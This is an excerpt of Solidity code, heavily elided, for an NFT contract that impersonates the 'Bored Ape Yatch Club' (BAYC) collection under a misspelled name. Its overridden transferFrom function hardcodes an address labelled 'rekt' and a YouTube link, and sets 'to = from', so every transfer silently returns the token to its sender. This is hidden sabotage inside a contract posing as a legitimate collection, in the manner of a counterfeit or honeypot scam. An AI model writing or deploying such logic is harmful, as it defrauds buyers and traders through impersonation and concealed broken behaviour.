  ...
  IERC721Enumerable
{
  ...
  function transferFrom(
    ...
    address rekt = 0x6861698B928562e396b9B6db2c0AbB17C4c729cd;
    string memory quellegaronloaparatooooooooo = "https://www.youtube.com/watch?v=JEdDaalYx0s";
    to = from;
...
contract BAYC is ERC721A, IERC2981, Ownable, ReentrancyGuard {
    ...
    constructor(
    ) ERC721A("Bored Ape Yatch Club", "BAYC", 100, maxSupply) {
    }
